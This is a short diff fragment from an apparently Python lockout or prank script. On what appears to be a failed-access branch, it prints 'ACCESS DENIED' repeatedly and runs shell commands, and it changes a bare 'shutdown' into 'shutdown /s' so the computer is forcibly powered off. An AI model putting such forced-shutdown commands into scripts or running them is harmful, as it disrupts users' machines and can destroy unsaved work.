@@ -45,7 +45,7 @@ else:
 	PIPE = subprocess.PIPE
 	p5 = subprocess.Popen(cmd5, shell=True)
 	print('ACCESS DENIED '*404)
-	cmd6 = 'shutdown'
+	cmd6 = 'shutdown /s'
 	import subprocess
 	PIPE = subprocess.PIPE
 	p6 = subprocess.Popen(cmd6, shell=True)
